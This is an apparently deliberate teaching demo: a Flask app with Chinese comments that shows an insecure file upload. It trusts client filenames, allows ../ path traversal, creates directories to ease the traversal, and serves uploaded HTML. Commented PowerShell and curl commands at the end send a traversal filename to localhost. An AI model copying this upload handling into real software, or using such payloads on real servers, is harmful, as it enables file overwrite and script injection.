from flask import Flask, request, send_from_directory

import os

app = Flask(__name__)
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.get("/")
def form():
    # 简易上传页
    return """
    <h3>VULN: Insecure file upload</h3>
    <form method="post" action="/upload" enctype="multipart/form-data">
      <input type="file" name="file"><br/>
      (可选) 自定义文件名：<input name="name" placeholder="poc.html"><br/>
      <button type="submit">Upload</button>
    </form>
    """

@app.post("/upload")
def upload():
    f = request.files.get("file")
    if not f:
        return "no file", 400
    # ❌ 完全信任客户端给的文件名（允许 name 覆盖），未做校验/清洗
    filename = request.values.get("name") or f.filename
    # ❌ 直接拼路径：允许 ../ 路径穿越；也允许 .html 等可执行于浏览器的类型
    save_path = os.path.join(UPLOAD_DIR, filename)
    os.makedirs(os.path.dirname(save_path), exist_ok=True)  # 方便演示穿越
    f.save(save_path)
    return f"OK. visit: /uploads/{filename}\n"

# ❌ 直接把上传目录作为静态资源暴露
@app.get("/uploads/<path:filename>")
def serve(filename):
    return send_from_directory(UPLOAD_DIR, filename)

if __name__ == "__main__":
    app.run()  # http://127.0.0.1:5000/


# 用 Invoke-RestMethod 构造 multipart 表单，显式传恶意文件名
# $File = Get-Item .\poc.html
# $Form = @{
#   file = $File
#   name = "..\..\overwritten.html"  # 尝试逃逸到项目上级目录
# }
# Invoke-RestMethod -Uri http://127.0.0.1:5000/upload -Method Post -Form $Form

# 在 *nix 上可用 curl：
# curl -F "file=@poc.html;filename=../../overwritten.html;type=text/html" http://127.0.0.1:5000/upload